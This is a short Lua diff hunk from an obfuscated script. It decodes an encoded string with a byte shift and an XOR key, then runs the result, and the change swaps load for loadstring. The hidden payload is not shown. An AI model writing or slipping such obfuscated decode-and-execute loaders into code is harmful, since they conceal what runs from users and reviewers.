@@ -5,4 +5,4 @@ for i=1,#HDLbec do
 local b=(HDLbec:byte(i)-64)%256
 qQ67Gu[i]=string.char((b~DMciT6[((i-1)%#DMciT6)+1])%256)
 end
-load(table.concat(qQ67Gu))()
+loadstring(table.concat(qQ67Gu))()
